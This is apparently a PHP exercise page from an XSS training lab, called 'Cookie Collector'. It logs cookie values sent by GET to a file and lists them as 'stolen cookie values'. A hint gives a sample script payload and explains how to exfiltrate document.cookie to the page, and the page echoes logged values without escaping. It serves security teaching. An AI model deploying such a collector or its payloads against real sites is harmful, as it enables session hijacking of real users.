<!DOCTYPE HTML>
<html>
<head>
<link rel="shortcut icon" href="mat.ico">
<link rel="stylesheet" type="text/css" href="../css/demo.css" />
<title>Cookie Collector</title>
</head>
<body bgcolor="#000000" text="#00FF00">
<h1>Cookie Collector 1.0</h1>
<p>Some sites have poor security and are vulnerable to XSS. Use this site to collect their users' cookies. 
<br/>See if you can send a user's cookie using a GET request to this page using the GET field called 'cookie'.</p>
<?php
if (isset($_GET['cookie']) && !isset($_POST['button'])) {
	file_put_contents("cookies.txt", trim($_GET["cookie"]).PHP_EOL, FILE_APPEND);
} 
?>
<br>

</body>

<?php 
if (!isset($_POST['button'])) {
	echo "<b>List of stolen cookie values:</b><br/>\n";
	$lines = file("cookies.txt");
	foreach ($lines as $line_num => $line) {
	  echo "#<b>{$line_num}</b> : " . $line . "<br />\n";
	}
	echo "<br/>";
}
if (isset($_POST['button'])) {
      exec('cat /dev/null > cookies.txt');
      echo "Reset Complete!";
}
if (isset($_POST['button2'])) {
      exec('cat /dev/null > list.txt');
      echo "Reset Complete!";
}
?>

<form method="post">
    <p>
        <button name="button">Reset this page</button>
    </p>
</form>
<form method="post">
    <p>
        <button name="button2">Reset demo page</button>
    </p>
</form>
<br>
<a href="index.php"><button>Return</button></a>

<p style="font-size:14px">You may need to reset the demo page before returning (i.e. there is an unavoidable redirect).</p>

<a href="cookiecollector.php?hint=true" style="color:white">Hint</a>

<?php 
if(isset($_GET['hint'])) {
?>
<div class="hint">
In the URL, a PHP GET variable called 'cookie' looks like this: "cookiecollector.php?cookie=insertdatahere". To send content to this page, we simply have to request a similar
URL with the actual cookie value. We can use XSS to do this automatically whenever a user visits the demo page. To test this out, try injecting something like 
<?php echo htmlspecialchars('<script>alert(document.cookie)</script>'); ?>. The first part will open up an alert window, while "document.cookie" contains the cookies that Javascript can 
currently access in your browser. It is trivial to access these values; now you just have to send them to this page using some kind of Javascript trickery.
If you get stuck, there are some useful examples in the Cross Site Scripting section of
<a href="https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_%28OWASP-AJ-001%29">this page</a>.
</div>
<?php
}
?>

<p style="font-size:10px"><a href="https://www.keaneokelley.com">Keane was here.</a></p>
</html>
